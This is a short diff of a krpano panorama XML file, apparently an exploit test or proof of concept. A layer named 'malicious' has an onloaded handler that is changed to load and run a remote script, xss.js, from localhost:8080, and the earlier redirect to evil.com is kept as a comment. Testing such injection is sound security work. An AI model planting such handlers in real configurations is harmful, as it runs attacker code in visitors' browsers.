@@ -2,5 +2,6 @@
     <layer name="malicious" 
            type="container" 
            visible="true" 
-           onloaded="openurl('https://evil.com', _parent);"/>
+           onloaded="loadjs('http://localhost:8080/xss.js');
+        //openurl('https://evil.com', _parent);"/>
 </krpano>
